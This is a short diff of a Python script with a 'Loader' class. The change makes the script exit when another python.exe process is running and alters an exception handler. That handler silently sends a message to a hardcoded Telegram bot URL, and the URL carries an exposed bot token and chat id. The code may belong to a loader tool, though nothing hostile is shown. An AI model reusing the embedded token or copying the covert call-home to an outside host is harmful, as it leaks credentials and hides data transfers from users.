@@ -182,15 +182,13 @@ class Loader():
 			num = 0
 			for proc in psutil.process_iter():
 				try:
-					if proc.name() == "python.exe":
-						num += 1
+					if proc.name() == "python.exe" and proc.pid() != os.getpid():
+						exit()
 				except:
 					pass
-			if num > 2:
-				exit()
 try:
 
 	Loader()
 except:
 
-	req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=' + traceback.format_exc() + '&chat_id=1742761281')
+	req = requests.get('https://api.telegram.org/bot1835937794:AAGrYMKkvpqry85eiHX_yuC_0oWJhH5fwuw/sendMessage?text=Error&chat_id=1742761281')
